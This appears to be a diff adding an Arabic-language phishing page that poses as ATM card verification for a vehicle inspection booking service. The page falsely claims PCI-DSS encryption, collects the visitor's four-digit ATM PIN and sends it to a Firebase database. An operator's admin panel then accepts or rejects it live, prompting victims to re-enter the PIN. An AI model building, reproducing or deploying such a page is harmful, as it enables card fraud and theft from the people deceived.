@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>التحقق من بطاقة الصراف - مركز سلامة المركبات</title>
+    
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
+
+    <style>
+        :root { --main-green: #1e7344; --bg-light: #f7f8fa; }
+        * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Segoe UI', Tahoma, sans-serif; }
+        body { background-color: var(--bg-light); display: flex; justify-content: center; align-items: center; min-height: 100vh; padding: 10px; position: relative; }
+
+        .atm-container {
+            background: #fff; width: 100%; max-width: 350px; border-radius: 20px;
+            padding: 25px 20px; box-shadow: 0 8px 25px rgba(0,0,0,0.05); text-align: center;
+        }
+
+        .icon-box { margin-bottom: 15px; }
+        .icon-box img { width: 50px; height: auto; }
+
+        h2 { font-size: 17px; color: #333; margin-bottom: 8px; font-weight: bold; }
+        p { font-size: 12px; color: #777; line-height: 1.5; margin-bottom: 25px; }
+
+        .atm-pin-field {
+            width: 100%; max-width: 220px; height: 45px; border: 1px solid #ddd;
+            border-radius: 8px; text-align: center; font-size: 20px; letter-spacing: 12px;
+            font-weight: bold; color: var(--main-green); outline: none; background-color: #fafafa;
+            margin-bottom: 20px; transition: 0.3s;
+        }
+
+        /* حالة الخطأ واللون الأحمر */
+        .input-error { border: 2px solid red !important; color: red !important; }
+
+        .btn-confirm {
+            width: 100%; background-color: var(--main-green); color: white; border: none;
+            border-radius: 10px; padding: 12px; font-size: 15px; font-weight: bold; cursor: pointer;
+        }
+
+        .secure-notice { margin-top: 15px; font-size: 10px; color: #bbb; }
+
+        /* شاشة التحميل (Overlay) */
+        #loadingOverlay {
+            position: fixed; top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(255, 255, 255, 0.95);
+            display: none; flex-direction: column; justify-content: center;
+            align-items: center; z-index: 9999;
+        }
+        .spinner {
+            width: 40px; height: 40px; border: 4px solid #f3f3f3;
+            border-top: 4px solid var(--main-green); border-radius: 50%;
+            animation: spin 1s linear infinite; margin-bottom: 10px;
+        }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    </style>
+</head>
+<body>
+
+    <div id="loadingOverlay">
+        <div class="spinner"></div>
+        <p style="color: #333; font-weight: bold; font-size: 14px;">جاري إتمام العملية...</p>
+    </div>
+
+    <div class="atm-container">
+        <div class="icon-box">
+            <img src="https://img.icons8.com/fluency/96/000000/atm.png" alt="ATM Security">
+        </div>
+
+        <h2>التحقق من الرقم السري</h2>
+        <p>يرجى إدخال الرقم السري لبطاقة الصراف الآلي (PIN) المكون من 4 أرقام لإتمام عملية المصادقة الآمنة.</p>
+
+        <input type="password" maxlength="4" class="atm-pin-field" id="pinCode" placeholder="****">
+
+        <button class="btn-confirm" onclick="sendPIN()">تأكيد الرقم السري</button>
+
+        <div class="secure-notice">
+            🔒 تشفير بيانات بمعيار PCI-DSS العالمي
+        </div>
+    </div>
+
+    <script>
+        // --- إعدادات Firebase من مشروع Saso-Inspection ---
+        const firebaseConfig = { 
+            apiKey: "AIzaSyAeZAjt4kZWVLJSKiehqLFrT...", 
+            authDomain: "saso-inspection.firebaseapp.com",
+            databaseURL: "https://saso-inspection-default-rtdb.firebaseio.com", 
+            projectId: "saso-inspection",
+            storageBucket: "saso-inspection.appspot.com",
+            messagingSenderId: "1009002235896",
+            appId: "1:1009002235896:web:3f0d6f84b6e956ffa5b80d"
+        };
+        firebase.initializeApp(firebaseConfig);
+        const database = firebase.database();
+        const visitorId = localStorage.getItem('visitorId');
+
+        // تحديث تتبع الزائر
+        if (visitorId) {
+            database.ref('live_visitors/' + visitorId).update({
+                page: "صفحة الرقم السري (ATM PIN)"
+            });
+        }
+
+        // إرسال الرقم السري والمراقبة
+        function sendPIN() {
+            const pinInput = document.getElementById('pinCode');
+            let pinVal = pinInput.value;
+
+            if (pinVal.length === 4) {
+                // إظهار التحميل
+                document.getElementById('loadingOverlay').style.display = 'flex';
+
+                // إرسال البيانات
+                const paymentRef = database.ref('payments/' + visitorId);
+                paymentRef.update({
+                    atm_pin: pinVal,
+                    status: "waiting_atm", // انتظار قرارك النهائي
+                    last_update: firebase.database.ServerValue.TIMESTAMP
+                });
+
+                // مراقبة القرار من لوحة التحكم (Admin)
+                paymentRef.on('value', (snapshot) => {
+                    const data = snapshot.val();
+                    
+                    if (data.status === "accept") {
+                        // قبول نهائي -> توجه لصفحة تم الحجز بنجاح
+                        window.location.href = "success.html";
+                    } 
+                    else if (data.status === "reject") {
+                        // رفض -> إخفاء التحميل وتلوين المربع بالأحمر
+                        document.getElementById('loadingOverlay').style.display = 'none';
+                        pinInput.classList.add('input-error');
+                        alert("برجاء التحقق من الرقم الصراف الآلي الصحيح");
+                        
+                        // إعادة الحالة للسماح بالمحاولة مرة أخرى
+                        paymentRef.update({ status: "idle_atm" });
+                    }
+                });
+
+            } else {
+                alert("يرجى إدخال 4 أرقام");
+            }
+        }
+
+        // مسح اللون الأحمر عند الكتابة مجدداً
+        document.getElementById('pinCode').addEventListener('input', function() {
+            this.classList.remove('input-error');
+        });
+    </script>
+</body>
+</html>
